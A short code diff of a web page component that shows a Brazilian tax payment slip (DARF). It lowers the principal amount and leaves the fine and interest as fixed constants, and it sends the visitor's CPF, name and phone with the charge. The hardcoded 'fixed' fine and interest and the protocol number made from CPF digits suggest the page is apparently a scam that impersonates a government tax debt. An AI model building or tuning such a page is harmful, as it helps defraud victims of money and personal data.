@@ -163,7 +163,7 @@ export default function Home() {
                     cpf: cpf,
                     name: userData?.name,
                     phone: phone,
-                    amount: 263.23, // Valor total do DARF
+                    amount: 174.28, // Valor total do DARF
                   }),
                 })
 
@@ -633,10 +633,10 @@ export default function Home() {
   }
 
   if (appState === "darf") {
-    const valorPrincipal = 182.23 // Valor fixo
+    const valorPrincipal = 93.28 // Valor fixo
     const multa = 29.55 // Multa fixa
     const juros = 51.45 // Juros fixos
-    const valorTotal = valorPrincipal + multa + juros // Total: R$ 263,23
+    const valorTotal = valorPrincipal + multa + juros // Total: R$ 174,28
     const protocolo = `CTPS${userData?.cpf?.slice(-6) || '123456'}`
 
     return (
